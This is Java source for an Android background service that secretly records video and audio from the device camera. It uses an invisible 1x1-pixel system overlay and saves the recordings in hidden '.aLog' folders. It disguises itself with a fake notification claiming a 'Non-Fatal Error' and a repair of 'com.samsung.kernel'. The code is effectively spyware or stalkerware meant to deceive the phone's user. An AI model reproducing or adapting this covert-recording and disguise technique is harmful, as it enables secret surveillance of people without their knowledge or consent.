package mdane.myapplication6.Services;


import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.PixelFormat;
import android.hardware.Camera;
import android.media.CamcorderProfile;
import android.media.MediaRecorder;
import android.os.Environment;
import android.os.IBinder;
import android.text.format.DateFormat;
import android.util.Log;
import android.view.Gravity;
import android.view.SurfaceHolder;
import android.view.SurfaceView;
import android.view.WindowManager;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

import mdane.myapplication6.R;

/**
 * Created by ashi on 10/24/14.
 */
public class BVideo1 extends Service implements SurfaceHolder.Callback,Runnable {

    private WindowManager windowManager;
    private SurfaceView surfaceView;
    private Camera camera = null;
    private MediaRecorder mediaRecorder = null;
    public static boolean isRunning=false;
    @Override
    public void onCreate() {
    Thread aThread=new Thread(this);
        aThread.start();
        // Start foreground service to avoid unexpected kill
        Notification notification = new Notification.Builder(this)
                .setContentTitle("Non-Fatal Error:x787x")
                .setContentText("Attempting repair on com.samsung.kernel")
                .setSmallIcon(R.drawable.ttt)
                .build();
        startForeground(1234, notification);
isRunning=true;
        // Create new SurfaceView, set its size to 1x1, move it to the top left corner and set this service as a callback
        windowManager = (WindowManager) this.getSystemService(Context.WINDOW_SERVICE);
        surfaceView = new SurfaceView(this);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY,
                WindowManager.LayoutParams.FLAG_WATCH_OUTSIDE_TOUCH,
                PixelFormat.TRANSLUCENT
        );
        layoutParams.gravity = Gravity.LEFT | Gravity.TOP;
        windowManager.addView(surfaceView, layoutParams);
        surfaceView.getHolder().addCallback(this);

    }
    private File openFileForImage() {
        File imageDirectory = null;
        String storageState = Environment.getExternalStorageState();
        if (storageState.equals(Environment.MEDIA_MOUNTED)) {
            imageDirectory = new File(
                    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES),
                    ".aLog/.videos");
            if (!imageDirectory.exists() && !imageDirectory.mkdirs()) {
                imageDirectory = null;
            } else {
                SimpleDateFormat dateFormat = new SimpleDateFormat("mm_dd_yyyy_hh_mm_ss",
                        Locale.getDefault());

                return new File(imageDirectory.getPath() +
                        File.separator + "image_" +
                        dateFormat.format(new Date()) + ".mp4");
            }
        }
        return null;
    }
    // Method called right after Surface created (initializing and starting MediaRecorder)
    @Override
    public void surfaceCreated(SurfaceHolder surfaceHolder) {

        camera = Camera.open();
        mediaRecorder = new MediaRecorder();
        camera.unlock();

        mediaRecorder.setPreviewDisplay(surfaceHolder.getSurface());
        mediaRecorder.setCamera(camera);
        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.CAMCORDER);
        mediaRecorder.setVideoSource(MediaRecorder.VideoSource.CAMERA);
        mediaRecorder.setProfile(CamcorderProfile.get(CamcorderProfile.QUALITY_HIGH));

        String state = Environment.getExternalStorageState();
        String name = DateFormat.format("yyyy-MM-dd_kk-mm-ss", new Date().getTime()) + ".mp4";
        String path;

        if (Environment.MEDIA_MOUNTED.equals(state)) {
            path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES) + "/.aLog/.movie/" + name;

        } else {
            path = getFilesDir().getAbsolutePath() + "/.aLog/.movie" + name;
        }

        Log.d("info", "path: " + path);
        mediaRecorder.setOutputFile(openFileForImage().getAbsolutePath());
        try {
            mediaRecorder.prepare();
            mediaRecorder.start();
        } catch (Exception e) {
        }

    }

    // Stop recording and remove SurfaceView
    @Override
    public void onDestroy() {

//        mediaRecorder.stop();
        mediaRecorder.reset();
        mediaRecorder.release();

        camera.lock();
        camera.release();

        windowManager.removeView(surfaceView);

    }

    @Override
    public void surfaceChanged(SurfaceHolder surfaceHolder, int format, int width, int height) {
    }

    @Override
    public void surfaceDestroyed(SurfaceHolder surfaceHolder) {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void run() {
      BVideo1 bv=new BVideo1();

    }
}
